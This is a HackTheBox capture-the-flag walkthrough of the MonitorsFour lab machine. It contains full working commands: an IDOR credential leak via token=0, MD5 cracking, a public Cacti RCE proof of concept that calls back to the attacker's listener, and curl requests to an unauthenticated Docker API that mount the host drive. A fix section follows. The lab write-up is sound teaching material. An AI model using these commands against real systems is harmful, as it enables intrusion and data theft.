---
title: "HTB — MonitorsFour Writeup"
date: 2026-05-24
categories: [HackTheBox, Easy]
tags: [windows, idor, php, cacti, docker, rce, cve, hashcat, md5]
description: "IDOR → MD5 cracking → Cacti RCE (CVE-2025-24367) → Docker API escape (CVE-2025-9074). Full walkthrough with Blue Team section."
image:
  path: /assets/img/writeups/monitorsfour/Cacti.png
---

**Platform**: HackTheBox | **Difficulty**: Easy | **OS**: Windows (Docker Desktop / WSL2)
**Machine:** [HTB — MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)
**Chain**: IDOR → Hash cracking → Cacti RCE → Docker escape

---

## Overview

MonitorsFour is a Windows box that hides almost its entire attack surface behind a PHP web application and a containerized infrastructure. The path unfolds in four acts: a logic flaw in an API leaks credentials, those credentials grant access to a vulnerable monitoring service with an RCE, the resulting shell lands inside a Docker container, and the final escape leverages the Docker API exposed without authentication on the internal network.

---

## 1. Reconnaissance

```bash
rustscan -a $IP --ulimit 5000 -- -sC -sV
```

| Port | Service | Notes |
|------|---------|-------|
| 80   | HTTP nginx | Redirects to `monitorsfour.htb` — virtual hosting |
| 5985 | WinRM (Microsoft HTTPAPI) | Windows shell access if valid creds |

**Why this matters:** The nginx + WinRM combination on a Windows box is a classic containerization signal. nginx typically runs on Linux — here it's inside a Docker Desktop container on the Windows host. Port 5985 is the actual Windows WinRM. This observation should have triggered suspicion immediately.

```bash
echo "$IP monitorsfour.htb" | sudo tee -a /etc/hosts
```

---

## 2. Web Enumeration

### Subdomain discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt \
     -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" \
     -ac -t 50 -s | tee fuzz.txt
# cacti
```

**Result:** `cacti.monitorsfour.htb`

![Cacti interface](/assets/img/writeups/monitorsfour/Cacti.png)

```bash
echo "$IP monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

**Why fuzz vhosts:** A single server can host multiple websites based on the HTTP `Host:` header. Since the box already uses virtual hosting (the IP → domain redirect gives it away), there are likely other hidden sites behind the same IP. `cacti.monitorsfour.htb` turns out to be the real entry point.

### Endpoint enumeration

```bash
ffuf -u http://monitorsfour.htb/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -e .php -t 50 -mc 200,301,302,403 -ic
```

| Route | Status | Notes |
|-------|--------|-------|
| `/login` | 200 | Login page |
| `/forgot-password` | 200 | Password reset |
| `/user` | 200 | **API endpoint — 35 bytes response** |
| `/static` | 301 | Assets |
| `/controllers` | 403 | Source code not directly accessible |

```bash
curl "http://monitorsfour.htb/user"
# {"error":"Missing token parameter"}

curl "http://monitorsfour.htb/user?token=test"
# {"error":"Invalid or missing token"}
```

---

## 3. IDOR — Credential leak via token=0

**The flaw:** The `/user?token=` endpoint validates a user identifier. The controller logic does (in pseudocode):

```php
if ($token) {
    return get_user($token);   // valid token → one user
} else {
    return get_all_users();    // otherwise → ALL users
}
```

The developer wrote `if ($token)` instead of `if ($token !== null)`. In PHP, the value `0` is **falsy** — `if(0)` evaluates to false. Passing `token=0` falls into the `else` branch and returns the entire table.

**This is an IDOR** (*Insecure Direct Object Reference*) combined with a falsy value logic flaw. Key takeaway: always test `0`, `-1`, empty string, `null` on any identification parameter.

```bash
curl -s "http://monitorsfour.htb/user?token=0" | python3 -m json.tool
```

**Result:**
```json
[
  {"username": "admin", "password": "56b32eb43e6f15395f6c46c1c9e1cd36", "name": "Marcus Higgins"},
  {"username": "mwatson", "password": "69196959c16b26ef00b77d82cf6eb169", "name": "Michael Watson"}
]
```

---

## 4. MD5 Hash Cracking

The hashes are **unsalted MD5** — trivial to crack.

```bash
# On Mac with native Hashcat (M5 GPU via Metal)
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hashes.txt
hashcat -m 0 hashes.txt ~/wordlists/rockyou.txt
```

**Result:** `56b32eb43e6f15395f6c46c1c9e1cd36` → `wonderful1`

**Why MD5 is dangerous:** Unsalted MD5 can be cracked in seconds on a modern GPU. Identical passwords always produce identical hashes, and rainbow tables cover most common passwords.

---

## 5. Cacti Access — CVE-2025-24367 (Authenticated RCE)

Navigate to `http://cacti.monitorsfour.htb/cacti/` — the version is displayed at the bottom: **Cacti 1.2.28**.

**Credential subtlety:** The API username is `admin`, but the full name is *Marcus Higgins*. Cacti uses the first name as the login identifier → authenticate with `marcus` / `wonderful1`.

**CVE-2025-24367:** Cacti 1.2.28 is vulnerable to an authenticated RCE. The exploit abuses the graphs/templates feature to generate a PHP file in the webroot and then trigger it.

```bash
# T1 — Listener
penelope -p 9001

# T4 — Exploit
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
sudo python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus -p wonderful1 \
  -i $ME -l 9001
```

**Shell obtained:** `www-data` inside a Docker container.

![Shell www-data](/assets/img/writeups/monitorsfour/www-data.png)

---

## 6. Post-exploitation — Inside the container

```bash
id        # uid=33(www-data)
hostname  # 821fbd6a43fa  ← short hash = Docker container ID
ip addr   # 172.18.0.3/16 on eth0
ip route  # default via 172.18.0.1
```

**User flag:**
```bash
cat /home/marcus/user.txt
```

![User flag](/assets/img/writeups/monitorsfour/user.png)

---

## 7. Container Escape — CVE-2025-9074 (Unauthenticated Docker API)

**Context:** Docker Desktop on Windows exposes its REST API on `192.168.65.7:2375` without authentication. CVE-2025-9074 documents exactly this exposure: Linux containers can reach this endpoint and interact with the Windows host's Docker Engine.

```bash
curl -s http://192.168.65.7:2375/version
# {"Platform":{"Name":"Docker Engine - Community"},...,"Version":"28.3.2",...}
```

On Docker Desktop + WSL2, the `C:\` Windows drive is exposed under `/mnt/host/c`. We create a container that mounts this path:

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/mnt/host_root"]
    }
  }' \
  http://192.168.65.7:2375/containers/create -o /tmp/response.json

cid=$(grep -o '"Id":"[^"]*"' /tmp/response.json | cut -d'"' -f4)
curl -s -X POST http://192.168.65.7:2375/containers/$cid/start
sleep 2
curl -s "http://192.168.65.7:2375/containers/$cid/logs?stdout=true" --output -
```

![Root flag](/assets/img/writeups/monitorsfour/root.png)

**Root flag obtained.**

---

## Full Attack Chain

```
IDOR token=0
    → MD5 hash leaked (admin / marcus)
        → Hashcat → wonderful1
            → Cacti login (marcus:wonderful1)
                → CVE-2025-24367 → RCE → www-data shell
                    → Docker container (172.18.0.3)
                        → Docker API 192.168.65.7:2375 (CVE-2025-9074)
                            → bind mount /mnt/host/c
                                → root.txt ✅
```

---

## 🛡️ How to Fix These Vulnerabilities

### 1. IDOR + falsy logic on `/user?token=`
**Fix:** Replace `if ($token)` with `if ($token !== null && $token !== '')`. Add mandatory authentication on all API endpoints.

### 2. Unsalted MD5 hashes
**Fix:** Use `password_hash()` in PHP (bcrypt by default) or Argon2id. Never store MD5/SHA1 for passwords.

### 3. Cacti 1.2.28 — CVE-2025-24367
**Fix:** Update Cacti. Restrict access by IP. Apply the principle of least privilege.

### 4. Unauthenticated Docker API — CVE-2025-9074
**Fix:** Disable "Expose daemon on tcp://localhost:2375 without TLS". If TCP is required → TLS + mutual certificates. Isolate containers on dedicated networks.

---

## 💡 Key Takeaways

- **Test falsy values** (`0`, `-1`, `""`, `null`) on any identification parameter.
- **Don't give up on vhost fuzzing too early** — `cacti` was the real attack surface.
- **Read HTTP headers** — `X-Powered-By: PHP/8.3.27` + `PHPSESSID` reveal the tech stack from the very first curl.
- **nginx on Windows = likely containerization** — TTL 127 + nginx = strong Docker Desktop signal.
- **Unauthenticated Docker API = immediate root** — reaching port 2375 from a compromised container is game over.
